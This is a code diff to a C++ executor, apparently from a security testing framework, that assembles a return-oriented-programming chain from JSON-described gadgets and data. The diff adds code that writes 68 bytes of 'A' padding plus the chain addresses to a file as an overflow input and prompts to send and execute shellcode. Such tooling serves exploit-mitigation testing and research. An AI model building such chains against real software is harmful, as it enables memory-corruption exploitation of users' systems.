@@ -3,6 +3,7 @@
 #include "../../common/rapidjson/schema.h"
 #include "../../common/rapidjson/stringbuffer.h"
 #include "exec_ropchain.h"
+#include <fstream>
 
 #define JSON_PAYLOAD_SCHEMA "{\n\
 \"type\": \"object\",\n\
@@ -75,14 +76,16 @@ bool ExecutorROPChain::Execute(TestCommon::TestData &data)
 				{
 					const rapidjson::Value& payloadArray = fakePayloadJsonDocument["payload"];
 
+                    unsigned index = 0;
+
 					// Adding POP POP RET as the first gadget to make the stack ready for the chain execution
 					unsigned int currentGadgetOffset = gadgetDbIndexed.find("POP EAX ; POP EAX ; RET")->second;
 					char * address = (char *)gadgetDbRemoteAddr + currentGadgetOffset;
-					fakePayload[0] = (DWORD)address;
+					fakePayload[index] = (DWORD)address;
 
 					std::wcerr << "[+] Filling the payload buffer" << std::endl;
 
-					for (rapidjson::SizeType i = 0; i < payloadArray.Size(); i++)
+					for (rapidjson::SizeType i = 0; i < payloadArray.Size(); ++i, ++index)
 					{
 						currentGadgetOffset = 0;
 						address = NULL;
@@ -92,19 +95,35 @@ bool ExecutorROPChain::Execute(TestCommon::TestData &data)
 							std::string currentGadget = payloadArray[i].FindMember("G")->value.GetString();
 							unsigned int currentGadgetOffset = gadgetDbIndexed.find(currentGadget)->second;
 							char * address = (char *)gadgetDbRemoteAddr + currentGadgetOffset;
-							fakePayload[i+1] = (DWORD)address;
+							fakePayload[index] = (DWORD)address;
 
 							std::wcerr << "    GADGET:    " << payloadArray[i].FindMember("G")->value.GetString()
 								<< " --> 0x" << std::hex << (DWORD)address << std::endl;
 						}
 						else
 						{
-							char * data = (char *)std::stoi(payloadArray[i].FindMember("D")->value.GetString(), nullptr, 16);
-							fakePayload[i+1] = (DWORD)data;
+							char * payloadData = (char *)std::stoi(payloadArray[i].FindMember("D")->value.GetString(), nullptr, 16);
+							fakePayload[index] = (DWORD)payloadData;
 
 							std::wcerr << "    DATA:    " << payloadArray[i].FindMember("D")->value.GetString() << std::endl;
 						}
 					}
+
+                    FILE * ropChainFile = fopen("C:\\rop_chain.txt", "wb");
+                    if (ropChainFile != NULL)
+                    {
+                        fwrite("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", sizeof(char), 68, ropChainFile);
+                        for (unsigned i = 0; i < payloadArray.Size() + 1; ++i) {
+                            DWORD address = fakePayload[i];
+                            fwrite(&address, sizeof(DWORD), 1, ropChainFile);
+                        }
+                        fclose(ropChainFile);
+                    }
+                    else
+                    {
+                        std::wcerr << L"    Error opening file to write the shellcode." << std::endl;
+                        return false;
+                    }
 
 					std::wcerr << L"    Prass ENTER to send and execute the shellcode." << std::endl;
 					std::getchar();
